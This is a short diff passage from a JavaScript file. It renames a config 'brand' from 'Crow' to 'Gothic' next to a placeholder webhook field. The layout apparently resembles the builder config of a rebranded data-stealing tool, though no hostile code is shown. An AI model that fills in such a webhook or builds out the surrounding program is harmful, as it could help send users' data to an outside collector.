@@ -10,7 +10,7 @@ const fs = require("fs");
 
 
 var config = {
-    brand: "Crow",
+    brand: "Gothic",
 
     webhook: "%WEBHOOK%",
 
